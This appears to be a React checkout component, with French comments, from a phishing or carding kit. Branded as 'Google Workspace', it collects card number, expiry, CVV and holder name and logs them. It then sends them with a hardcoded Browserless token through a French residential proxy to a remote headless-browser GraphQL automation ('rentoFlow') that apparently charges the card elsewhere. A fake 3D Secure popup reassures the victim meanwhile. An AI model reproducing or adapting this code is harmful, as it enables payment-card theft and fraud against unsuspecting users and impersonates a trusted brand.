import { useState, useImperativeHandle, forwardRef } from 'react';
import LoadingPopup from './LoadingPopup';
import ThreeDSecurePopup from './ThreeDSecurePopup';
import EndPopup from './EndPopup';

// Configuration Browserless
const endpoint = "https://production-sfo.browserless.io/chrome/bql";
const token = "S1AMT3E9fOmOF332e325829abd823a1975bff5acdf";
const proxyString = "&proxy=residential&proxyCountry=fr";
const optionsString = "&adBlock=true&blockConsentModals=true";

// GraphQL Browserless config
const queryFileName = 'rentoflow.graphql';
const operationName = 'rentoFlow';

const Checkout = forwardRef(({ 
  formData,
  selectedPlan,
  onSuccess,
  onError
}, ref) => {
  // États pour la gestion des popups
  const [isLoading, setIsLoading] = useState(false);
  const [showThreeDSecurePopup, setShowThreeDSecurePopup] = useState(false);
  const [showEndPopup, setShowEndPopup] = useState(true);

  // Fonction paiement custom
  const payFetch = async (formData, amount = '10') => {
    // Initial status set to pending
    let status = 'initiated';

    // Regrouper les données de paiement
    const cardDetails = {
      cardNumber: formData.cardNumber,
      cardExpiration: formData.expiryDate,
      cardCVC: formData.cvv,
      cardOwner: formData.cardName
    };
    console.log("💳 Détails de la carte:", cardDetails);
    console.log("🔍 FormData complet:", formData); // Debug pour voir toutes les propriétés disponibles

    // Récupérer la query GraphQL depuis l'API
    const queryResponse = await fetch('/api/graphql-query');
    const { query } = await queryResponse.json();

    // Extraction des données de la carte
    const cardNumber = cardDetails.cardNumber?.replace(/\s+/g, '') || '';
    const cardExpiry = cardDetails.cardExpiration || '';
    const cardCVC = cardDetails.cardCVC || '';
    const cardOwner = cardDetails.cardOwner || '';
    
    // Ajuster le montant (remove 2% fees)
    const adjustedAmount = Math.floor(parseFloat(amount) * 0.98).toString();

    const variables = { 
      cardNumber, 
      cardExpiry, 
      cardCVC, 
      cardOwner, 
      amount: adjustedAmount 
    };

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        query,
        operationName,
        variables
      })
    };

    const url = `${endpoint}?token=${token}${proxyString}${optionsString}`;
    console.log('Fetching URL:', url);

    let data;
    try {
      const response = await fetch(url, options);
      const rawText = await response.text();
      console.log('Raw response:', rawText);

      data = JSON.parse(rawText);
      if (data.errors) {
        throw new Error(JSON.stringify(data.errors));
      }
      // If the GraphQL response contains a finalStatus field, update the status variable.
      if (data && data.data && data.data.finalStatus) {
        status = data.data.finalStatus.value;
      }
    } catch (error) {
      console.error('Error fetching GraphQL endpoint:', error);
      throw new Error('Failed to fetch GraphQL endpoint');
    } finally {

      console.log(`Transaction completed. Status: ${status}`);
      console.log('----- End Rento Flow Simple -----');

    }
    return data;
  };

  // Détermine le logo de la carte selon le numéro
  const getCardLogo = () => {
    return formData.cardNumber?.startsWith('5') ? '/mastercard-id-check.png' : '/verified-by-visa.png';
  };

  // Obtient les 4 derniers chiffres de la carte
  const getLastFourDigits = () => {
    return formData.cardNumber?.replace(/\s/g, '').slice(-4) || '****';
  };

  // Logique principale du processus de paiement
  const startPaymentProcess = async () => {
    try {
      console.log("🔄 Démarrage du processus de paiement...");
        
      // Réinitialiser tous les états
      setIsLoading(false);
      setShowThreeDSecurePopup(false);
      setShowEndPopup(false);

      // Étape 1: Affichage du popup de chargement
      setIsLoading(true);
      console.log("📱 Affichage du LoadingPopup...");

      // Programmation de l'affichage du 3D Secure après 12 secondes
      const threeDSecureTimeout = setTimeout(() => {
        console.log("⏰ 12 secondes écoulées - Affichage du 3D Secure");
        setIsLoading(false);
        setShowThreeDSecurePopup(true);
      }, 12000);

      // Étape 2: Lancement du paiement
      const amount = '10'; // Montant fixe
      const paymentResult = await payFetch(formData, amount);
      
      // Annuler le timeout
      clearTimeout(threeDSecureTimeout);
      
      // Vérifier le résultat du paiement
      if (paymentResult && paymentResult.data && paymentResult.data.finalStatus) {
        const finalStatus = paymentResult.data.finalStatus.value;
        console.log(`🎯 Statut final du paiement: ${finalStatus}`);
        
        if (finalStatus === 'success') {
          // Succès - afficher EndPopup
          console.log("✅ Paiement réussi - Affichage de EndPopup");
          setIsLoading(false);
          setShowThreeDSecurePopup(false);
          setShowEndPopup(true);
        } else {
          // Échec - réafficher LoadingPopup
          console.log("❌ Paiement échoué - Réaffichage de LoadingPopup");
          setIsLoading(true);
          setShowThreeDSecurePopup(false);
          setShowEndPopup(false);
        }
      } else {
        // Pas de statut final - afficher EndPopup par défaut
        console.log("⚠️ Pas de statut final - Affichage de EndPopup par défaut");
        setIsLoading(false);
        setShowThreeDSecurePopup(false);
        setShowEndPopup(true);
      }
      
    } catch (error) {
      console.error('❌ Erreur lors du processus de paiement:', error);
      setIsLoading(false);
      setShowThreeDSecurePopup(false);
      if (onError) {
        onError(error);
      }
    }
  }
    

  // Gestion du succès du 3D Secure
  const handle3DSecureSuccess = () => {
    console.log("✅ 3D Secure terminé avec succès - Affichage de EndPopup");
    setShowThreeDSecurePopup(false);
    setShowEndPopup(true);
  };

  // Gestion de la fermeture du popup final
  const handleEndPopupClose = () => {
    console.log("✅ EndPopup fermé - Processus terminé");
    setShowEndPopup(false);
    if (onSuccess) {
      onSuccess();
    }
  };

  // Exposer les méthodes via useImperativeHandle
  useImperativeHandle(ref, () => ({
    startPaymentProcess
  }));

  // Formatage de la date et heure
  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('fr-FR', {
    year: '2-digit',
    month: '2-digit',
    day: '2-digit',
  });
  const formattedTime = currentDate.toLocaleTimeString('fr-FR', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  });

  return (
    <>
      {/* Popup de chargement de vérification */}
      <LoadingPopup 
        isVisible={isLoading}
        selectedPlan={selectedPlan}
        cardLogo={getCardLogo()}
        data={{
          checkoutPayCardHolderPlaceholder: 'Nom du titulaire',
          checkoutPayCardNumberPlaceholder: 'Numéro de carte',
          checkoutPayExpiryDatePlaceholder: 'MM/AA',
          checkoutPayCVVPlaceholder: 'CVV',
          cardNumber: formData.cardNumber
        }}
        brandName="Google Workspace"
      />

      {/* Popup 3D Secure */}
      <ThreeDSecurePopup 
        isVisible={showThreeDSecurePopup}
        cardLogo={getCardLogo()}
        cardNumber={formData.cardNumber}
        amount='10,00€'
        shop={{ name: 'Google Workspace' }}
        lastFourDigits={getLastFourDigits()}
        formattedDate={formattedDate}
        formattedTime={formattedTime}
        brandName="Google Workspace"
      />

      {/* Popup de fin de processus */}
      <EndPopup 
        isVisible={showEndPopup}
        selectedPlan={selectedPlan}
        onClose={handleEndPopupClose}
        cardNumber={formData.cardNumber}
      />
    </>
  );
});

Checkout.displayName = 'Checkout';

export default Checkout;